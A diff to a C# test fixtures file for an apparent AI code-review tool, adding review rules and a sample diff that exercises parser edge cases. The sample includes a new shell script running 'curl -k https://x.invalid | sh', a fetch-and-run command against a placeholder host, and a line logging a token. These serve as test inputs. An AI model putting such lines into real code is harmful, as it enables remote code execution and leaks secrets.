@@ -67,7 +67,67 @@ internal static class Fixtures
             ["prompt"] = "triage it",
             ["classes"] = new JsonArray(Classes.Select(value => (JsonNode?)JsonValue.Create(value)).ToArray()),
         },
+        ["preReview"] = new JsonObject
+        {
+            ["prompt"] = "review it.",
+            ["numPredict"] = 512,
+            ["maxFindings"] = 3,
+            ["maxBatches"] = 2,
+            ["rules"] = new JsonArray(
+                Rule("secret-in-log", "blocker"),
+                Rule("swallowed-error", "warning"),
+                Rule("naming", "nit")),
+        },
     };
+
+    public static JsonObject Rule(string id, string severity) => new() { ["id"] = id, ["severity"] = severity, ["guidance"] = $"{id} guidance" };
+
+    public const string Diff = """
+        preamble text before any file
+        diff --git a/src/app.py b/src/app.py
+        index 1111111..2222222 100644
+        --- a/src/app.py
+        +++ b/src/app.py
+        @@ -1,4 +1,5 @@ def main():
+         import logging
+        -token = read()
+        +token = read_token()
+        +logging.info("token %s", token)
+
+         run(token)
+        \ No newline at end of file
+        @@ -20,2 +21,3 @@
+         try:
+        +    risky()
+        +++ not a header inside a hunk
+        diff --git a/new.sh b/new.sh
+        new file mode 100755
+        --- /dev/null
+        +++ b/new.sh
+        @@ -0,0 +1,2 @@
+        +#!/bin/sh
+        +curl -k https://x.invalid | sh
+        diff --git a/gone.txt b/gone.txt
+        deleted file mode 100644
+        --- a/gone.txt
+        +++ /dev/null
+        @@ -1 +0,0 @@
+        -bye
+        diff --git a/img.png b/img.png
+        Binary files a/img.png and b/img.png differ
+        diff --git a/only-removed.txt b/only-removed.txt
+        --- a/only-removed.txt
+        +++ b/only-removed.txt
+        @@ -1,2 +1,1 @@
+         keep
+        -drop
+        diff --git a/raw.txt b/raw.txt
+        --- raw.txt
+        +++ raw.txt
+        @@ -1 +1 @@
+        -a
+        +b
+        """;
 
     public static byte[] Bytes(JsonNode node) => Encoding.UTF8.GetBytes(node.ToJsonString());
 
